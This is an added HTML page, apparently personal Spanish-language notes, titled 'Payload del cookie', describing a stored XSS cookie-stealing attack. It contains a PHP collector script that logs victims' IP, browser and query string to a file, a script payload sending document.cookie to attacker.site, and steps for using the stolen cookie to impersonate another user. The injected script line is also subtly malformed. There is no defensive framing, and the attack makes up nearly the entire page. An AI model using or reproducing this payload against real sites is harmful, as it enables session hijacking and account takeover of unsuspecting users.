@@ -1,0 +1,31 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Payload del cookie</title>
+</head><body><b><span style="font-size: 16pt"><span style="background-color: #ffa300">Para hacer us store XXS</span><span style="background-color: #ffff00"><br/>
+</span><span style="background-color: #ffff00"><br/>
+attacker.site/get.php?test=hereismydata<br/>
+<br/>
+&lt;?php<br/>
+<br/>
+$ip = $_SERVER[ 'REMOTE_ADDR' ] ;<br/>
+$browser = $_SERVER[ 'HTTP_USER_AGENT '] ;<br/>
+<br/>
+<br/>
+$fp = fopen('jar.txt', 'a');<br/>
+<br/>
+fwrite($fp, $ip.' ' .$browser. &quot; \n&quot;);<br/>
+fwrite($fp, urldecode($_SERVER[ 'QUERY_STRING']). &quot; \n\n&quot;);<br/>
+fclose($fp);<br/>
+?&gt;<br/>
+<br/>
+<br/>
+</span></span></b><span style="font-size: 16pt"><span style="background-color: #00ffff">ponemos este comando en donde esta el XXS en la pagina web</span><b><span style="background-color: #ffff00"><br/>
+</span></b><b><span style="background-color: #ffff00">&lt;script&gt; var i = new Image() ; i.src=&quot;http://attacker.site/get.php?cookie=&quot;=escape(document.cookie)&lt;/script&gt;<br/>
+<br/>
+</span></b><span style="background-color: #00ffff">Despues cojemos el cookie y usamos firebug para editar el cookie y ya estaremos haciendonos pasar por otro usuario<br/>
+<br/>
+Podemos crear un web server para el atacante en 5 minutos con <b>Wamp</b>para Windows y <b>Lamp</b>para Linux<br/>
+<br/>
+<br/>
+</span></span></body></html>
